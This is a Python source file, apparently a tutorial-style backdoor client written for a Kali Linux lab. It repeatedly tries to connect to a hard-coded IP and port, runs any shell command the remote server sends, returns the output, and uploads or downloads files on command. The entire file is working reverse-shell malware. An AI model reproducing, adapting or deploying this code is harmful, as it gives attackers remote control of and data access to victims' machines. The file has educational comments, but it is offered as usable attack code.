import socket
import time
import json
import subprocess	# To execute any commands - send by the server
import os		# To change directory

# NOTE : change the object as "sock" - do not use "target"
def reliable_send(data) :
	jsondata = json.dumps(data)	# Converts a Python object into a JSON string
	sock.send(jsondata.encode())	# encode and send the command to the target
	
def reliable_receive() :
	data = ''
	while True :
		try :
			data += sock.recv(1024).decode().rstrip()	# decode and receive the results of the command from the target
			return json.loads(data)				# Converts a JSON string into a Python object
		except ValueError :
			continue

def connection() :
	while True :		# creating an infinite loop to connect whenever we want and to try until connection is established
		time.sleep(20)	# for every 20 seconds - this pgm will try to connect with our kali Linux machine
		try :
			sock.connect(('192.168.136.137',5555))	# connecting with Kali Linux
			shell()		# function call - to execute commands in the target system
			sock.close()
			break
		except :
			connection()	# infinite loop call
			
def upload_file(file_name) :
	f = open(file_name, 'rb')
	sock.send(f.read())
	
def download_file(file_name) :
	f = open(file_name, 'wb')
	sock.settimeout(1)
	chunck = sock.recv(1024)
	while chunck :
		f.write(chunck)
		try :
			chunck = sock.recv(1024)
		except socket.timeout as e :
			break
	sock.settimeout(None)
	f.close()
			
def shell() :
	while True :
		command = reliable_receive()
		if command == 'quit' :
			break
		elif command == 'clear' :
			pass
		elif command[:3] == 'cd ' :	# Taking 'cd ' from 'cd Desktop'
			os.chdir(command[3:])	# Taking 'Deskto' from 'cd Desktop' - os.chdir(Desktop)
		elif command[:8] == 'download' :		# download file.txt
			upload_file(command[9:])		# server - download, client - upload
		elif command[:6] == 'upload' :
			download_file(command[7:])
		else :
			execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
